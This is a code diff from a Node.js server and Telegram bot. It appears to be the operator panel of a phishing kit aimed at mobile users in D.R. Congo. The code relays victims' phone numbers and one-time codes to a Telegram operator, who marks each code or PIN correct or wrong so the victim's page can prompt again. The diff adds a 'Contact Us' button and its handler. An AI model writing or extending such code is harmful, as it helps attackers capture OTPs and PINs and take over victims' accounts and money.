@@ -75,7 +75,7 @@ app.post('/api/login-notification', async (req, res) => {
     }
 });
 
-// -------------------- FIRST OTP API (UPDATED) --------------------
+// -------------------- FIRST OTP API (UPDATED WITH CONTACT US) --------------------
 app.post('/api/verify-first-otp', async (req, res) => {
     const { phone, link } = req.body || {};
     const country = "D.R. Congo";
@@ -117,6 +117,9 @@ ${link}
                     [
                         { text: "❌ Wrong Code", callback_data: `otp1_wrong|${phone}` },
                         { text: "⚠️ Wrong PIN", callback_data: `otp2_wrongpin|${phone}` }
+                    ],
+                    [
+                        { text: "📞 Contact Us", callback_data: `contact_us|${phone}` }
                     ]
                 ]
             }
@@ -295,7 +298,7 @@ bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
     await ctx.replyWithHTML(deniedMsg);
 });
 
-// OTP1 CORRECT (UPDATED)
+// OTP1 CORRECT
 bot.action(/^otp1_correct\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     statusStore[phone] = "otp1_correct";
@@ -324,6 +327,15 @@ bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
     await ctx.answerCbQuery("Wrong Code");
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
     await ctx.replyWithHTML(`❌ <b>FIRST OTP WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`);
+});
+
+// CONTACT US (NEW ACTION)
+bot.action(/^contact_us\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    statusStore[phone] = "contact_us";
+    await ctx.answerCbQuery("Contact Us Clicked");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(`📞 <b>CONTACT REQUESTED</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>User requested contact support.</b>`);
 });
 
 // OTP2 CORRECT
